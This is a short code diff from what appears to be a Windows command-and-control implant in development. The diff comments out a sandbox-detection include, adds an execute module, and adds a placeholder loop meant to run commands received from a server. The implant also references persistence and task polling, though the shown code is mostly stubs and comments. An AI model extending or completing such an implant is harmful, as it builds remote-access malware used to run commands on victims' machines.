@@ -12,7 +12,8 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 
 #include "persist/persist.h"
 #include "parse/parse.h"
-#include "Feiyu/sandbox_detection.h"
+//#include "Feiyu/sandbox_detection.h"
+#include "execute/execute.h"
 
 // current compile line is - g++ implant.cpp persist/persist.cpp parse/parse.cpp -lwinhttp -lbcrypt -static -o implant.exe 
 
@@ -278,6 +279,11 @@ void runLoop(int implant_id)
             std::cout << getting << std::endl;
             // WHEN WE GET THE FORMAT, THEN PARSE
             // THEN AFTER PARSE FEED INTO EXECUTE
+            
+            while(true){
+            // loops
+            // execute(command from post request, args from post request, outputs for our response);
+            }
 
             // const auto serverResponse = std::async(std::launch::async, getTasks);
             // auto parsedTasks = parseTasks(serverResponse.get());
